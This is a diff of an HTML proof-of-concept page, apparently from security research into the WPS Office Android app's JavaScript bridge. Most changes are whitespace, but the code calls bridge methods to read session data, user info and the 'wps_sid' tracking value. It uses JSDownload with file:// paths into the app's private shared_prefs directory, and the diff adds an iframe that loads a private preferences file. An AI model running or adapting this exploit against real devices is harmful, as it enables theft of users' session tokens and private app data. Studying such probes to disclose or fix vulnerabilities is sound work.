@@ -89,7 +89,7 @@
             }
         }
 
-        function requestSess(){
+        function requestSess() {
             try {
                 document.getElementById("myP").innerHTML = splash.requestSession();
             } catch (error) {
@@ -97,7 +97,7 @@
             }
         }
 
-        function requestSessUserInfo(){
+        function requestSessUserInfo() {
             try {
                 document.getElementById("myP").innerHTML = splash.requestSessionUserInfo();
             } catch (error) {
@@ -105,7 +105,7 @@
             }
         }
 
-        function trackingInfo(){
+        function trackingInfo() {
             try {
                 document.getElementById("myP").innerHTML = splash.trackingInfo("wps_sid");
             } catch (error) {
@@ -113,9 +113,9 @@
             }
         }
 
-        function tryDownload(){
+        function tryDownload() {
             try {
-                document.getElementById("myP").innerHTML = splash.JSDownload("random","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/testFINDME.txt")
+                document.getElementById("myP").innerHTML = splash.JSDownload("random", "https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/testFINDME.txt")
                 // document.getElementById("myP").innerHTML += splash.download("https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt","./")
                 // document.getElementById("myP").innerHTML += splash.download("/sdcard","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
                 // document.getElementById("myP").innerHTML += splash.download("./","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
@@ -124,9 +124,9 @@
             }
         }
 
-        function tryDownload2(){
+        function tryDownload2() {
             try {
-                document.getElementById("myP").innerHTML = splash.JSDownload("random","https://account.wps.com/api/v3/mine#.txt")
+                document.getElementById("myP").innerHTML = splash.JSDownload("random", "https://account.wps.com/api/v3/mine#.txt")
                 // document.getElementById("myP").innerHTML += splash.download("https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt","./")
                 // document.getElementById("myP").innerHTML += splash.download("/sdcard","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
                 // document.getElementById("myP").innerHTML += splash.download("./","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
@@ -135,9 +135,9 @@
             }
         }
 
-        function tryDownload3(){
+        function tryDownload3() {
             try {
-                document.getElementById("myP").innerHTML = splash.JSDownload("random","file:///data/data/cn.wps.moffice_eng/shared_prefs/fileradar_record.xml")
+                document.getElementById("myP").innerHTML = splash.JSDownload("random", "file:///data/data/cn.wps.moffice_eng/shared_prefs/fileradar_record.xml")
                 // document.getElementById("myP").innerHTML += splash.download("https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt","./")
                 // document.getElementById("myP").innerHTML += splash.download("/sdcard","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
                 // document.getElementById("myP").innerHTML += splash.download("./","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
@@ -146,9 +146,9 @@
             }
         }
 
-        function tryDownload4(){
+        function tryDownload4() {
             try {
-                document.getElementById("myP").innerHTML = splash.JSDownload("random","/sdcard/findMeNow.txt")
+                document.getElementById("myP").innerHTML = splash.JSDownload("random", "/sdcard/findMeNow.txt")
                 // document.getElementById("myP").innerHTML += splash.download("https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt","./")
                 // document.getElementById("myP").innerHTML += splash.download("/sdcard","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
                 // document.getElementById("myP").innerHTML += splash.download("./","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
@@ -234,18 +234,20 @@
 
     </p>
     <ul class="list-group" id="list">
-        <ul>
-            <!-- Optional JavaScript -->
-            <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-            <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
-                integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
-                crossorigin="anonymous"></script>
-            <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
-                integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
-                crossorigin="anonymous"></script>
-            <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
-                integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
-                crossorigin="anonymous"></script>
+    </ul>
+
+    <iframe src="file:///data/data/cn.wps.moffice_eng/shared_prefs/public_default.xml" width=200 height=300></iframe>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
+        integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
+        crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+        integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+        crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
+        integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
+        crossorigin="anonymous"></script>
 </body>
 
 </html>
